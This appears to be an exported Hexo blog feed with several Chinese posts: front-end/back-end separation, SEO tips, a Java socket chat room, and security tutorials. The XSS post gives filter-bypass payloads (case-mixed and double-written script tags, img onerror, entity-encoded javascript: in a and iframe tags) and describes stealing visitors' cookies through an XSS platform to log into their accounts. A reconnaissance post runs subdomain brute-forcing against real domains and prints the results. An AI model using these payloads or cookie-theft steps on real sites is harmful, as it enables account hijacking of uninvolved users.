title="这样做的好处是："></a>这样做的好处是：</h4><p>1.<br>可以实现真正的前后端解耦，前端服务器使用nginx。前端服务器放的是css，js，图片等等一系列静态资源（甚至你还可以css，js，图片等资源放到特定的文件服务器，例如阿里云的oss，并使用cdn加速），前端服务器负责控制页面引用，跳转，调用后端的接口，后端服务器使用tomcat。（这里需要使用一些前端工程化的框架比如nodejs，react，router，react，redux，webpack）</p><p>2.<br>发现bug，可以快速定位是谁的问题，不会出现互相踢皮球的现象。页面逻辑，跳转错误，浏览器兼容性问题，脚本错误，页面样式等问题，全部由前端工程师来负责。接口数据出错，数据没有提交成功，应答超时等问题，全部由后端工程师来解决。</p><p>3.<br>双方互不干扰，前端与后端是相亲相爱的一家人。</p><p>4.<br>在大并发情况下，我可以同时水平扩展前后端服务器，比如淘宝的一个首页就需要2000台前端服务器做集群来抗住日均多少亿+的日均pv。（去参加阿里的技术峰会，听他们说他们的web容器都是自己写的，就算他单实例抗10万http并发，2000台是2亿http并发，并且他们还可以根据预知洪峰来无限拓展，很恐怖，就一个首页。。。）</p><p>5.<br>减少后端服务器的并发压力，除了接口以外的其他所有http请求全部转移到前端nginx上。</p><p>6.<br>即使后端服务暂时超时或者宕机了，前端页面也会正常访问，只不过数据刷不出来而已。</p><p>7.<br>也许你也需要有微信相关的轻应用，那样你的接口完全可以共用，如果也有app相关的服务，那么只要通过一些代码重构，也可以大量复用接口，提升效率。</p><p>8.<br>页面显示的东西再多也不怕，因为是异步加载。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>1.<br>在开需求会议的时候，前后端工程师必须全部参加，并且需要制定好接口文档，后端工程师要写好测试用例，不要让前端工程师充当你的组专职测试，推荐使用chrome的插件postman，service层的测试用例拿junit写。</p><p>2.<br>上述的接口并不是java里的interface，说白了调用接口就是调用你controler里的方法。</p><p>3.<br>加重了前端团队的工作量，减轻了后端团队的工作量，提高了性能和可扩展性。</p><p>4.<br>我们需要一些前端的框架来解决类似于页面嵌套，分页，页面跳转控制等功能。（上面提到的那些前端框架）。</p><p>5.<br>如果你的项目很小，或者是一个单纯的内网项目，那你大可放心，不用任何架构而言，但是如果你的项目是外网项目，呵呵哒。</p><p>6.<br>以前还有人在使用类似于velocity/freemarker等模板框架来生成静态页面，现在这种做法也被淘汰掉了。</p><p>7.<br>这篇文章主要的目的是说jsp在大型外网java web项目中被淘汰掉，可没说jsp可以完全不学，对于一些学生朋友来说，jsp/servlet等相关的java web基础还是要掌握牢的，不然你以为springmvc这种框架是基于什么来写的？</p>]]></content>
      
      
      <categories>
          
          <category> JSP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS注入</title>
      <link href="/2019/12/21/websafety/xss/"/>
      <url>/2019/12/21/websafety/xss/</url>
      
        <content type="html"><![CDATA[<h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h3 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h3><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>通过这段js代码，弹个框来证明存在xss漏洞。<br>弹框只是为了证明存在此漏洞。而此漏洞的利用方式由很多种。<br>比如，可以使用xss平台：<br><a href="http://xsspt.com/index.php" target="_blank" rel="noopener">平台地址</a><br><a href="https://blog.csdn.net/qq_17046291/article/details/99336431" target="_blank" rel="noopener">平台使用教程</a><br><img src="http://img.ahdy.top/2019-12-21_013951.png" alt></p><pre><code>当某人进入带有脚本的页面时，js脚本会获取他的cookie并发往xss平台。你只需要登录xss平台等待即可，拿到cookie后，可以不需要密码登录他的账号。</code></pre><p>对于存储型xss漏洞的表现形式，比较经典的是留言板。但是我们都是遵纪守法的好学生，不能对外面的网站进行测试，所以我拿了我自己的web项目做了一波操作。<br>发现存在xss注入，虽然Java的预处理查询有着防御sql注入的功能，但是针对于xss注入，还需要做很多防范措施。<br><img src="http://img.ahdy.top/QQ%E5%9B%BE%E7%89%8720191221014304.png" alt><br>选择平台生成的一些脚本注入之后，接收到了cookie，ip等相关信息<br><img src="http://img.ahdy.top/2019-12-21_014511.png" alt><br>同理任何访问被xss注入后的用户都会被收集信息。<br>其实在注入成功之后，你会发现留言内容和留言者的部分都为空，因为插入的js代码已经被浏览器解析执行了！</p><pre><code>这时我们按F12，打开浏览器的开发者工具，就能发现嵌入的js脚本。</code></pre><h3 id="XSS攻防"><a href="#XSS攻防" class="headerlink" title="XSS攻防"></a>XSS攻防</h3><p>作为一个开发，我们要保证项目的抗压能力。  </p><h3 id="如何防范xss？"><a href="#如何防范xss？" class="headerlink" title="如何防范xss？"></a>如何防范xss？</h3><p>1.<br>    在input标签里面加上maxlength属性</p><pre><code>&lt;input type=&quot;text&quot; name=&quot;nickname&quot; placeholder=&quot;留言者昵称&quot; maxlength=&quot;10&quot;&gt; 至于原理，就是因为js脚本的形式为&lt;script&gt;&lt;/script&gt;长度为17，所以只要我们在前端对长度进行限制，就可以阻止黑客进行xss攻击了可是！开发可没这么好做！作为攻击者，我们同样可以修改前端代码，具体的操作是使用浏览器的F12（开发者工具）我们可以直接进行长度的修改。另外，还可以用抓包的方法，在包里面直接写，也是不受长度限制的。所以这种方式只能针对&quot;脚本小子&quot;，并不切合实际</code></pre><p>2.<br>    对关键字script进行过滤</p><pre><code>很容易发现，要想进行xss攻击，必须插入一段js脚本，而js脚本的特征是很明显的，脚本中包含script关键字，那么我们只需要进行script过滤即可。但是js脚本是一种弱类型语言，不区分大小写，所以只需要对某一字母大小写切换，就可以实现绕过屏蔽。例：&lt;sCrIPt&gt;alert(1)&lt;/ScripT&gt; 这时候你可能会说，那把大小写一起屏蔽了不久行了？其实不然，因为语言特性，可以使用双写script的方式再次进行绕过  例：&lt;Sscriptcript&gt;alert(1)&lt;/Sscriptcript&gt; 原因，前面的S和后面的cript组合在一起，构成了新的Script关键字。</code></pre><p>3.<br>    使用正则表达式过滤</p><pre><code>攻击者如何再一次绕过？答案是：用img标签的oneerror属性&lt;img src=x onerror=alert(1)&gt; </code></pre><p>4.<br>    过滤alert关键字</p><pre><code>那么，攻击者该怎么办呢？答案是：编码绕过&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;a&lt;/a&gt; 这种编码方式为字符编码字符编码：十进制、十六进制ASCII码或unicode 字符编码，样式为“&amp;#数值;”, 例如“j”可以编码为“&amp;#106;”或“&amp;#x6a;”上述代码解码之后如下：&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt; 你能明显感觉到限制：由于使用到了a标签，所以只有点击时，才会弹框。能不能让所有进入这个页面的人都弹框？当然可以了：用iframe标签编码&lt;iframe src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt; 这种写法，同样既没有script关键字，又没有alert关键字。由于使用了iframe标签，留言板的样式会发生变形。实战中尽量不要用。</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>其实关于xss的注入方法数不胜数，学习的道路坎坎坷坷，只能一步一个坑的慢慢填。</p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>踩点(一)</title>
      <link href="/2019/12/17/websafety/webmseeage/"/>
      <url>/2019/12/17/websafety/webmseeage/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>时隔许久，已经很久没有写过关于web渗透的东西了，闲暇之余自学，希望以后有机会能往这方面发展，但愿现实不要那么残酷，会开发，又会运维看起来是一种非常牛批的双修大神。</p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">web域名查询网址</a><br><a href="http://beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">ICP备案信息查询</a><br>使用Kali自带的脚本查询<br><img src="http://img.ahdy.top/2019-12-17_184832.png" alt></p><h3 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h3><p>关于查询子域名的方法有很多，比如使用第三方网站，第三方工具<br>下面演示常用的方法<br>1.<br><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">子域名查询网</a><br><a href="http://z.zcjun.com/" target="_blank" rel="noopener">子域名查询网</a><br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">子域名查询网</a><br>2.使用第三方工具<br><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain下载</a><br>在仓库下方有相关使用文档的介绍<br>演示:<br> 查看官方文档进行文件配置<br><img src="http://img.ahdy.top/2019-12-17_182722.png" alt><br>配置成功信息<br>Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.21.0)<br>Requirement already satisfied: dnspython in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (1.16.0)  </p><p>安装好之后需要对脚本进行shell提权，绿色脚本即为提权脚本</p><pre><code>pip install -r requirements.txt如果电脑上没有配置pip的话，这个命令是无法执行的解决办法:在终端当中执行下面三条命令，命令执行完之后，再去执行安装wydomain命令一般就没有什么问题了。wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.pypip3 -V</code></pre><p>爆破命令：</p><pre><code>./dnsburte.py -d aliyun.com -f dnspod.csv -o message.txt</code></pre><p>查看：</p><pre><code>cat message.txt</code></pre><p>使用API查询目标的子域名:</p><pre><code>./wydomain.py -d ahdy.top -o andy.log</code></pre><p>显示样例</p><pre><code>oot@kali:~/Desktop/wydomain# ./wydomain.py -d baidu.com -o andy.log2019-12-17 00:44:49,894 [INFO] starting alexa fetcher...2019-12-17 00:44:50,322 [INFO] sign_fetch_is_failed2019-12-17 00:44:50,323 [INFO] alexa fetcher subdomains(22) successfully...2019-12-17 00:44:50,323 [INFO] starting threatminer fetcher...2019-12-17 00:44:53,139 [INFO] threatminer fetcher subdomains(0) successfully...2019-12-17 00:44:53,139 [INFO] starting threatcrowd fetcher...2019-12-17 00:44:55,187 [INFO] No JSON object could be decoded2019-12-17 00:44:55,187 [INFO] threatcrowd fetcher subdomains(0) successfully...2019-12-17 00:44:55,188 [INFO] starting sitedossier fetcher...2019-12-17 00:44:55,188 [INFO] request: http://www.sitedossier.com/parentdomain/baidu.com2019-12-17 00:44:57,185 [INFO] request: http://www.sitedossier.com/parentdomain/baidu.com/1012019-12-17 00:44:57,795 [INFO] request: http://www.sitedossier.com/parentdomain/baidu.com/2012019-12-17 00:45:00,199 [INFO] request: http://www.sitedossier.com/parentdomain/baidu.com/3012019-12-17 00:45:05,813 [INFO] sitedossier fetcher subdomains(300) successfully...2019-12-17 00:45:05,813 [INFO] starting netcraft fetcher...2019-12-17 00:45:17,687 [INFO] netcraft fetcher subdomains(0) successfully...2019-12-17 00:45:17,687 [INFO] starting ilinks fetcher...2019-12-17 00:45:22,707 [INFO] ilinks fetcher subdomains(0) successfully...2019-12-17 00:45:22,707 [INFO] starting chaxunla fetcher...2019-12-17 00:45:37,737 [INFO] HTTPConnectionPool(host=&#39;api.chaxun.la&#39;, port=80): Max retries exceeded with url: /toolsAPI/getDomain/?0.1576561522.71&amp;callback=&amp;k=baidu.com&amp;page=1&amp;order=default&amp;sort=desc&amp;action=moreson&amp;_=1576561522.71&amp;verify= (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f044169d9d0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known&#39;,))2019-12-17 00:45:37,738 [INFO] chaxunla fetcher subdomains(0) successfully...2019-12-17 00:45:37,738 [INFO] starting google TransparencyReport fetcher...2019-12-17 00:45:42,760 [INFO] &#39;NoneType&#39; object has no attribute &#39;__getitem__&#39;2019-12-17 00:45:42,761 [INFO] google TransparencyReport fetcher subdomains(0) successfully...2019-12-17 00:45:42,765 [INFO] baidu.com 485 subdomains save to /root/Desktop/wydomain/andy.logroot@kali:~/Desktop/wydomain# cat message.txt[&quot;0.baidu.com&quot;, &quot;1.baidu.com&quot;, &quot;01.baidu.com&quot;, &quot;11.baidu.com&quot;, &quot;1111.baidu.com&quot;, &quot;123.baidu.com&quot;, &quot;2012.baidu.com&quot;, &quot;2014.baidu.com&quot;, &quot;360.baidu.com&quot;, &quot;3g.baidu.com&quot;, &quot;8.baidu.com&quot;, &quot;IN.baidu.com&quot;, &quot;a.baidu.com&quot;, &quot;ab.baidu.com&quot;, &quot;abc.baidu.com&quot;, &quot;act.baidu.com&quot;, &quot;activity.baidu.com&quot;, &quot;ac.baidu.com&quot;, &quot;access.baidu.com&quot;, &quot;ad.baidu.com&quot;, &quot;admin.baidu.com&quot;, &quot;ads.baidu.com&quot;, &quot;ag.baidu.com&quot;, &quot;adm.baidu.com&quot;, &quot;ai.baidu.com&quot;, &quot;api.baidu.com&quot;, &quot;ap.baidu.com&quot;, &quot;app.baidu.com&quot;, &quot;ar.baidu.com&quot;, &quot;aq.baidu.com&quot;, &quot;as.baidu.com&quot;, &quot;ask.baidu.com&quot;, &quot;auth.baidu.com&quot;, &quot;auto.baidu.com&quot;, &quot;avatar.baidu.com&quot;, &quot;asp.baidu.com&quot;, &quot;b.baidu.com&quot;, &quot;b2b.baidu.com&quot;, &quot;bai.baidu.com&quot;, &quot;backup.baidu.com&quot;, &quot;baike.baidu.com&quot;, &quot;bao.baidu.com&quot;, &quot;bbs.baidu.com&quot;, &quot;bc.baidu.com&quot;, &quot;beian.baidu.com&quot;, &quot;beta.baidu.com&quot;, &quot;bh.baidu.com&quot;, &quot;bit.baidu.com&quot;, &quot;bk.baidu.com&quot;, &quot;box.baidu.com&quot;, &quot;book.baidu.com&quot;, &quot;brand.baidu.com&quot;, &quot;bx.baidu.com&quot;, &quot;cache.baidu.com&quot;, &quot;ca.baidu.com&quot;, &quot;cas.baidu.com&quot;, &quot;cb.baidu.com&quot;, &quot;ce.baidu.com&quot;, &quot;cdn.baidu.com&quot;, &quot;cc.baidu.com&quot;, &quot;ceshi.baidu.com&quot;, &quot;cf.baidu.com&quot;, &quot;cha.baidu.com&quot;, &quot;check.baidu.com&quot;, &quot;ci.baidu.com&quot;, &quot;city.baidu.com&quot;, &quot;ck.baidu.com&quot;, &quot;cloud.baidu.com&quot;, &quot;autodiscover.baidu.com&quot;, &quot;client.baidu.com&quot;, &quot;cm.baidu.com&quot;, &quot;code.baidu.com&quot;, &quot;com.baidu.com&quot;, &quot;company.baidu.com&quot;, &quot;credit.baidu.com&quot;, &quot;cs.baidu.com&quot;, &quot;cp.baidu.com&quot;, &quot;crm.baidu.com&quot;, &quot;d.baidu.com&quot;, &quot;daohang.baidu.com&quot;, &quot;db.baidu.com&quot;, &quot;dc.baidu.com&quot;, &quot;demo.baidu.com&quot;, &quot;desk.baidu.com&quot;, &quot;dev.baidu.com&quot;, &quot;df.baidu.com&quot;, &quot;dh.baidu.com&quot;, &quot;diy.baidu.com&quot;, &quot;disk.baidu.com&quot;, &quot;dj.baidu.com&quot;, &quot;dm.baidu.com&quot;, &quot;dns1.baidu.com&quot;, &quot;dn.baidu.com&quot;, &quot;doc.baidu.com&quot;, &quot;docs.baidu.com&quot;, &quot;dp.baidu.com&quot;, &quot;dq.baidu.com&quot;, &quot;ds.baidu.com&quot;, &quot;dx.baidu.com&quot;, &quot;du.baidu.com&quot;, &quot;dy.baidu.com&quot;, &quot;edm.baidu.com&quot;, &quot;e.baidu.com&quot;, &quot;edu.baidu.com&quot;, &quot;ee.baidu.com&quot;, &quot;em.baidu.com&quot;, &quot;email.baidu.com&quot;, &quot;ent.baidu.com&quot;, &quot;er.baidu.com&quot;, &quot;fang.baidu.com&quot;, &quot;f.baidu.com&quot;, &quot;fb.baidu.com&quot;, &quot;fashion.baidu.com&quot;, &quot;fc.baidu.com&quot;, &quot;feed.baidu.com&quot;, &quot;fff.baidu.com&quot;, &quot;file.baidu.com&quot;, &quot;finance.baidu.com&quot;, &quot;flash.baidu.com&quot;, &quot;fk.baidu.com&quot;, &quot;fm.baidu.com&quot;, &quot;focus.baidu.com&quot;, &quot;forum.baidu.com&quot;, &quot;fun.baidu.com&quot;, &quot;fund.baidu.com&quot;, &quot;g.baidu.com&quot;, &quot;g1.baidu.com&quot;, &quot;fz.baidu.com&quot;, &quot;g2.baidu.com&quot;, &quot;g3.baidu.com&quot;, &quot;g5.baidu.com&quot;, &quot;game.baidu.com&quot;, &quot;games.baidu.com&quot;, &quot;gb.baidu.com&quot;, &quot;gd.baidu.com&quot;, &quot;gh.baidu.com&quot;, &quot;git.baidu.com&quot;, &quot;gitlab.baidu.com&quot;, &quot;gl.baidu.com&quot;, &quot;gk.baidu.com&quot;, &quot;gongyi.baidu.com&quot;, &quot;go.baidu.com&quot;, &quot;gp.baidu.com&quot;, &quot;gps.baidu.com&quot;, &quot;gx.baidu.com&quot;, &quot;gy.baidu.com&quot;, &quot;h5.baidu.com&quot;, &quot;hao123.baidu.com&quot;, &quot;hao.baidu.com&quot;, &quot;health.baidu.com&quot;, &quot;hb.baidu.com&quot;, &quot;hd.baidu.com&quot;, &quot;help.baidu.com&quot;, &quot;hf.baidu.com&quot;, &quot;hi.baidu.com&quot;, &quot;hk.baidu.com&quot;, &quot;history.baidu.com&quot;, &quot;hm.baidu.com&quot;, &quot;home.baidu.com&quot;, &quot;house.baidu.com&quot;, &quot;hotel.baidu.com&quot;, &quot;houtai.baidu.com&quot;, &quot;hr.baidu.com&quot;, &quot;hot.baidu.com&quot;, &quot;ht.baidu.com&quot;, &quot;huodong.baidu.com&quot;, &quot;i.baidu.com&quot;, &quot;i1.baidu.com&quot;, &quot;hx.baidu.com&quot;, &quot;i2.baidu.com&quot;, &quot;hz.baidu.com&quot;, &quot;hy.baidu.com&quot;, &quot;id.baidu.com&quot;, &quot;im.baidu.com&quot;, &quot;global.baidu.com&quot;, &quot;images.baidu.com&quot;, &quot;ie.baidu.com&quot;, &quot;image.baidu.com&quot;, &quot;img.baidu.com&quot;, &quot;index.baidu.com&quot;, &quot;info.baidu.com&quot;, &quot;ip.baidu.com&quot;, &quot;ipv6.baidu.com&quot;, &quot;j.baidu.com&quot;, &quot;item.baidu.com&quot;, &quot;jia.baidu.com&quot;, &quot;jian.baidu.com&quot;, &quot;jiankang.baidu.com&quot;, &quot;jira.baidu.com&quot;, &quot;jj.baidu.com&quot;, &quot;job.baidu.com&quot;, &quot;jn.baidu.com&quot;, &quot;jq.baidu.com&quot;, &quot;js.baidu.com&quot;, &quot;ka.baidu.com&quot;, &quot;kb.baidu.com&quot;, &quot;kefu.baidu.com&quot;, &quot;kk.baidu.com&quot;, &quot;kl.baidu.com&quot;, &quot;km.baidu.com&quot;, &quot;ks.baidu.com&quot;, &quot;kr.baidu.com&quot;, &quot;lab.baidu.com&quot;, &quot;la.baidu.com&quot;, &quot;l.baidu.com&quot;</code></pre><h3 id="关于文中shell脚本的解释"><a href="#关于文中shell脚本的解释" class="headerlink" title="关于文中shell脚本的解释"></a>关于文中shell脚本的解释</h3><p>使用shell 命令对脚本提权<br>chmod +x 加上脚本名称(或者脚本的绝对路径)</p><p>进行提权后脚本会在目录当中以绿色显示<br>cd 目录<br>ls 显示当前文件夹路径</p><p>注意，一定要写成 ./test.sh，而不是 test.sh，运行其它二进制的程序也一样，直接写 test.sh，linux 系统会去 PATH 里寻找有没有叫 test.sh 的，而只有 /bin, /sbin, /usr/bin，/usr/sbin 等在 PATH 里，你的当前目录通常不在 PATH 里，所以写成 test.sh 是会找不到命令的，要用 ./test.sh 告诉系统说，就在当前目录找。</p><p>2、作为解释器参数</p><p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：</p><pre><code>/bin/sh test.sh/bin/php test.php</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域名 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简易版聊天室</title>
      <link href="/2019/12/11/java/socket/"/>
      <url>/2019/12/11/java/socket/</url>
      
        <content type="html"><![CDATA[<h3 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h3><p>已经有半个月没写文档了，到了大二，我深刻体会到了编程语言的博大精深，于是我陷入了思考，到底什么样算是会编程呢？我发现在一些Java书籍中，仅仅只是介绍了常用代码的使用方式，及作用，并没有涉及底层，构造原理，不懂底层也就谈不上修改，优化了，每当在写代码的时候，明明一个API下有那么多方法，我却仅仅只认得那么一两个方法，很多索引出的内容都要通过记忆单词的方式去过滤，学习知识都是照搬照抄，我真的了解编程吗？我想我并不会编程，我所使用的编程都是遵循原有的规则去实现的，那么这样走下去，我想我不会是一个程序员，顶多算一个代码搬运工，深知现状却无能为力，感慨万千：人生好难！</p><h3 id="socket实现简易聊天室"><a href="#socket实现简易聊天室" class="headerlink" title="socket实现简易聊天室"></a>socket实现简易聊天室</h3><h4 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h4><pre><code>package demo;import java.net.*; import java.io.*; import java.util.*; public class Server {   int port;   List&lt;Socket&gt; clients;   ServerSocket server;   public Server() { try {   port = 8083;   clients = new ArrayList&lt;Socket&gt;();   server = new ServerSocket(port);   System.out.println(&quot;服务器已启动&quot;);   int co=1;   while (true) {     Socket socket = server.accept();     clients.add(socket);     Mythread mythread = new Mythread(socket,co);     co++;     mythread.start();   } } catch (Exception ex) {   System.out.println(&quot;vv&quot;); } } public static void main(String[] args) { new Server(); } class Mythread extends Thread { Socket ssocket; private int count; private BufferedReader br; private PrintWriter pw; public String msg; public Mythread(Socket s,int c) {   ssocket = s;   count=c; } public void run() {   try {     br = new BufferedReader(new InputStreamReader(ssocket.getInputStream()));     msg = &quot;欢迎【&quot; +&quot;Client &quot;+count + &quot;】进入聊天室！当前聊天室有【&quot; + clients.size() + &quot;】人&quot;;     sendMsg();     while ((msg = br.readLine()) != null) {       msg = &quot;【&quot; +&quot;Client &quot;+count + &quot;】说：&quot; + msg;       sendMsg();     }   } catch (Exception ex) {   } } public void sendMsg() {   try {     System.out.println(msg);     for (int i = clients.size() - 1; i &gt;= 0; i--) {       pw = new PrintWriter(clients.get(i).getOutputStream(), true);       pw.println(msg);       pw.flush();     }   } catch (Exception ex) {   } } } } </code></pre><h3 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h3><pre><code>package demo;import java.io.*; import java.net.*; import java.util.*; public class Client {  public int port = 8083;  Socket socket = null;  public static void main(String[] args) {   new Client(); //开始执行  }  public Client() {   try {    socket = new Socket(&quot;127.0.0.1&quot;, port);    new Cthread().start();    BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));    String msg1;    while ((msg1 = br.readLine()) != null) { System.out.println(msg1);    }   } catch (Exception e) {      }  }  class Cthread extends Thread {   public void run() {    try { BufferedReader re = new BufferedReader(new InputStreamReader(System.in)); PrintWriter pw = new PrintWriter(socket.getOutputStream(), true); String msg2; while (true) {  msg2 = re.readLine();  pw.println(msg2); } } catch (Exception e) { e.printStackTrace();    }   }  } }</code></pre><p><img src="http://img.ahdy.top/2019-12-11_193934.png" alt><br>最终效果图，当然这样是无法实现多人在线聊天的，可以通过telnet来实现在线聊天，只不过这个聊天室是一个匿名的，基于cmd窗口。</p><h3 id="实现多人在线聊天"><a href="#实现多人在线聊天" class="headerlink" title="实现多人在线聊天"></a>实现多人在线聊天</h3><p>1.打开控制面板</p><p>2.找到功能和程序</p><p><img src="http://img.ahdy.top/2019-12-11_194343.png" alt></p><p>3.选择启用或关闭Windows功能</p><p>4.打开Windows当中的telnet功能</p><p><img src="http://img.ahdy.top/2019-12-11_194524.png" alt></p><p>5.win+R—&gt;cmd–&gt;输入telnet 127.0.0.1 端口号<br><img src="http://img.ahdy.top/2019-12-11_194839.png" alt><br><img src="http://img.ahdy.top/2019-12-11_194951.png" alt><br>如果让别的电脑连接聊天室需要将本机电脑的防火墙关闭（对方电脑与本机必须处于同一局域网下，否则需要将本机电脑的ip地址映射到公网上）</p><h3 id="可能发生的问题"><a href="#可能发生的问题" class="headerlink" title="可能发生的问题"></a>可能发生的问题</h3><p>无法打开到主机的连接 端口23失败？<br>可能是端口错了，因为telnet的默认连接端口是23  </p><p>格式：</p><pre><code>telnet不仅仅能连接23端口，但是telnet默认连接是23端口要连接其他端口，在cmd打命令telnet 192.168.1.1 135，中间没有“：”，是一个空格`这样telnet就连接到了对方的135端口`</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to use vue.js</title>
      <link href="/2019/12/11/framework/vue/"/>
      <url>/2019/12/11/framework/vue/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>不好意思，我在演示的过程中装崩掉了，过段时间写好，自己的博客就是随心所欲，这要是在csdn上放这话，下面指定挨喷！</p>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度域名收录</title>
      <link href="/2019/12/03/framework/baidufind/"/>
      <url>/2019/12/03/framework/baidufind/</url>
      
        <content type="html"><![CDATA[<h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>假如你做好了一个网站，并且成功映射域名，这时你想提升网站的知名度该怎么办？你可以通过百度搜索引擎提交你的域名，当百度收录了你的网站，那么该网站的域名就可以直接在百度上被搜索到</p><h3 id="提交地址"><a href="#提交地址" class="headerlink" title="提交地址"></a>提交地址</h3><p><a href="https://ziyuan.baidu.com/linksubmit/url?" target="_blank" rel="noopener">连接</a><br>当然提交了不一定100%被收录。</p><h3 id="简单的SEO"><a href="#简单的SEO" class="headerlink" title="简单的SEO"></a>简单的SEO</h3><pre><code>SEO就是对搜索引擎，搜索功能的优化，这里简单的说几个方法  1.Title 标签一般来说，Title标签中的单词最好保持在3~6个左右，最好包含关键字。但Title标签中的单词不要全部都是关键字，因为这样可能会造成页面关键字堆砌，导致过度优化。所选单词应简洁明了、具有描述性，要与网页内容具有很大的相关性，并且每个不同的页面都应该包含Title标签。2.Meta Description标签对Title标签优化之后，接下来就是对Meta Description标签的优化。Meta Description标签可以说是对Title标签的进一步解释，可以是一句话或者是包含十几个单词的短语。每个页面都该有其自己的Meta Description标签，并且Meta Description标签还可包含一些与网站内容相关但Title标签中未提及的信息。与Title标签要求相似，该部分内容也应具有描述性，与网页内容具有相关性，可包含关键字，但不可过多。3.Heading标签Heading标签包含了H1、H2、H3等等，是搜索引擎识别页面信息的重要标记。合理使用H1、H2、H3等不同级别的标签能够使得页面结构更加清晰，有利于搜索引擎的抓取。H1、H2、H3等标签是按照重要程度来排名的。一般一个页面按照需求程度来适当添加该标签：从H1开始，依次往下添加。但不可添加太多Heading标签，否则会适得其反。4.Strong和B标签相信大多数朋友都知道Strong和B标签都有加粗的意思，但是很多人并不清楚两者具体有什么区别。其实B标签就是单纯地将文字加粗，而Strong标签不仅是对文字加粗，并且这种形式的加粗会告诉搜索引擎该部分文字比较重要。所以两者从搜索引擎优化的角度来看，是有很大的区别的。上文中所提到的Heading标签页具有加粗效果，那么这三种标签到底该怎么用？其实，Heading标签一般用于文章大标题以及每段的小标题，而Strong标签一般用于文章段落中的重点词汇，而B标签一般只是强调一种视觉效果。5.ALT标签ALT标签是一种图片标签，它将图片的信息以文本的形式展现。对ALT标签的使用没有太多要求，只要在网页中出现图片的部分添加上该属性即可，但其标签内容应与相应页面内容具有相关性，长度不得过长，一般1~5个单词即可。以上介绍了HTML代码中的五种重要标签，相信会对做SEO工作的人员特别是SEO新手具有很大帮助。对HTML代码的优化一直是我们做搜索引擎优化工作的非常基础并且重要的一部分，只有做好了这部分优化工作，我们才能开展更加深层的优化。  &lt;title&gt;html对seo的优化&lt;/title&gt;&lt;meta name=&quot;title&quot; content=&quot;html对SEO的优化&quot;&gt;/*不推荐用这个*/&lt;meta name=&quot;keywords&quot; content=&quot;SEO,爬虫，搜索引擎、百度、html优化&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;通过html标签及属性的使用提高网站被爬虫爬取的几率，使用户百度时网站尽量排在前面，提高用户的点击率&quot;&gt;&lt;h1&gt;   //这个href应该是要写线上的首页地址，比项目目录地址要好&lt;a href=&quot;https://blog.csdn.net/qq_37291064/article/details/90442991&quot;&gt;    &lt;img src=&quot;images/pagelogo.png&quot;  alt=&quot;html对seo的优化&quot;/&gt;&lt;/a&gt;&lt;/h1&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 百度 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
